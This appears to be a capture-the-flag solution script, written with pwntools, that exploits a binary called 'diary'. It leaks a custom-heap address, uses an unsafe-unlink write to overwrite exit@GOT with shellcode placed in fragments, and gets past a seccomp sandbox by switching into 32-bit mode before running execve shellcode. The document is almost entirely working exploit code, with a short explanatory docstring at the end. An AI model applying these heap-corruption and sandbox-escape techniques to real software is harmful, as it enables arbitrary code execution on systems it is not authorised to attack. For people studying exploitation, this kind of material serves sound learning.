#!/usr/bin/env python
from pwn import *

context.terminal = ['tmux', 'sp', '-h']

elf = ELF('./diary')

def register(date, size, memo):
	io.sendlineafter('>> ', '1')
	io.sendlineafter('... ', date)
	io.sendlineafter('... ', str(size))
	io.sendafter('>> ', memo)

def delete(date):
	io.sendlineafter('>> ', '3')
	io.sendlineafter('... ', date)

def show(date):
	io.sendlineafter('>> ', '2')
	io.sendlineafter('... ', date)

io = process(elf.path)

register('2000/01/01', 0x20, 'A' * 0x20)
register('2000/01/02', 0x20, 'B' * 0x20)

delete('2000/01/01')
delete('2000/01/02')

register('2000/01/03', 0x40, 'A' * 0x2f + 'B')

show('2000/01/03')

io.recvuntil('B')
mmaped_page = u64(io.recv(6).ljust(8, '\x00')) - 0x80

log.info('Mmaped page (custom heap) @ {:#x}'.format(mmaped_page))

delete('2000/01/03')

shellcode = asm('''
	nop
	mov al, 0x09
	inc al
	push 0x602000
	pop rdi
	jmp $+0x5a
	push 0x1000
	pop rsi
	push 0x7
	jmp $+0x53
	pop rdx
	syscall
	xor eax, eax
	xor rsi, rsi
	xchg rsi, rdi
	add rsi, 0x148
	pop rdx
	syscall
	xor rsp, rsp
	mov rsp, rsi
	sub rsp, 0x08
	mov DWORD PTR[esp], esi
	mov DWORD PTR[esp+4], 0x23
	retf
''', arch='amd64')


register('2000/01/04', 0x30, shellcode[:13])
register('2000/01/05', 0x30, 'A' * 5 + shellcode[13:23])
register('2000/01/06', 0x30, shellcode[23:])

register('2000/01/07', 0x20, 'A' * 0x21)
register('2000/01/08', 0x20, p64(mmaped_page + 0x30) + p64(elf.got['exit'] - 0x8) + 'B' * 0x11)

delete('2000/01/08')

io.sendlineafter('>> ', '0')

io.sendline(asm(shellcraft.i386.linux.execve('/tmp/test')))

io.interactive()

"""
TL;DR
Leak mmaped page from the custom heap allocator then overwrite (exploiting unsafe unlink of the custom heap) exit@got with our shellcode written in pieces (relative jumps).
Bypass seccomp sandbox banned syscalls by changing CS to 0x23 (switching from 64bit to 32bit), execute 32 bit shellcode and run 32 bit binary.
"""
